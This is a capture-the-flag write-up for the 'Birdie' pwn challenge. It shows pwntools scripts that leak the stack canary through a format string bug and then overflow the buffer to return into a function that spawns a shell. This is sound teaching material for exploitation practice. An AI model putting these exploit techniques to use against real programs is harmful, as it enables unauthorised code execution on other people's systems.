For this challenge we have an elf file that has no PIE but has a stack canary.

```
┌──(pwn)(eurus㉿warfare)-[~/…/ShaktiCTF_TODO/my_writeup/shakti_ctf/Birdie]
└─$ python3 solver.py
[*] '/home/eurus/Documents/ShaktiCTF_TODO/my_writeup/shakti_ctf/Birdie/birdie'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

disassembling this elf we can see that we have a string format vulnerability and the possibility to make buffer overflow. And we can also see that we have a function that call ```system('/bin/sh')```. In order to win this challenge we need to redirect the flow of this binary to this function.

We can make a buffer overflow if we leak the canary on the stack. Fortunately with the format string vulnerability we can leak information from the binary during its execution.

```python
from pwn import *

elf = ELF('./birdie')
context.binary = elf

for i in range(1, 100):
    p = elf.process()
    p.recvuntil('Enter your name\n')
    p.sendline(f"%{i}$p")
    log.info(f"{i}:")
    leak = p.recvuntil('\n')
    log.info(leak)
    p.close()
```

I have write this little script in order to explore the stack and trying to find the exact position where the canary is.

```text
[*] 1:
[*] 0x7ffe1c4a8b70
[*] 2:
[*] 0x20
[*] 3:
[*] 0x7f69ca347e8e

[*] 0x10

[*] (nil)
[*] 12:

[*] 13:
[*] 0x400690
[*] 14:
[*] 0x7ffe929cda80

[*] 0x7fccfae1ed0a

[*] 0x7ffc3a997f28
[*] 19:
[*] 0x100000000
[*] 20:
[*] 0x4007e2
```

with this dump of the stack (attenction, this is not the stack of one single execution, but every leak in an offset is an execution) we can see that the canary is at the offset 15.  So we can dump the stack value sending to the server the string: ```%15$p```.

Now that we have the canary value we theoretically can perform a buffer overflow. Using cyclic and gdb we can find that the offset to the canary in the execution is 72 bytes. So with this information I have wrote a script that redirect the execution of the program.

```python
elf = ELF('./birdie')
context.binary = elf


p = elf.process()
#gdb.attach(p, gdbscript = 'b *0x00000000004007E2')
#p = remote("34.121.211.139", 1111)

p.recvuntil('Enter your name\n')
p.sendline(f"%15$p")
leak = str(p.recvuntil('\n'))
c = leak.replace('b\'','').replace('\\n\'','')

log.info(c)

win = 0x0000000000400873
ret_gd = 0x000000000040060e
canary = int(c, 16)
log.info(str(hex(canary)))
payload = b'A'*72+p64(canary)+p64(0)+p64(ret_gd)+p64(win)

p.recvuntil('Enter the payload\n')
p.sendline(payload)
p.interactive()
```

Doing that we have a shell that permit us to get the flag!
